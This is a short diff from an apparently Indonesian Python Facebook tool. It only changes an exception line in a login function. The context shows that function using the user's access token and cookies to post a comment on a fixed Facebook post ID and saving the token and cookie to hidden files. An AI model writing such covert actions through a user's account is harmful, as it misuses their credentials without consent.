@@ -257,8 +257,8 @@ def login():
 		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok) ###--------[ JANGAN GANTI ID NYA ]--------###
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
-          except Exception as e:exit(f" [{M}>{P}] Cookie Invalid")
-
+	except Exception as e:exit(f" [{M}>{P}] cookie invalid")
+			
 			
 			
 
